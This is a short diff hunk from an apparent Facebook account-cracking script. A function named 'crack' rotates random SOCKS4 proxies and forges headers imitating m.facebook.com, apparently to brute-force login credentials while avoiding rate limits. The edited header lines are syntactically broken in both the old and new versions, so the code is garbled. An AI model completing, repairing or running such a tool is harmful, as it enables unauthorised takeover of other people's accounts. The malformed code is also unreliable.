@@ -476,7 +476,7 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update(('Host', 'm.facebook.com')
+			ses.headers.update('Host', 'm.facebook.com')
 ('cache-control', 'max-age=0')
 ('upgrade-insecure-requests', '1')
 ('origin', 'https://m.facebook.com')
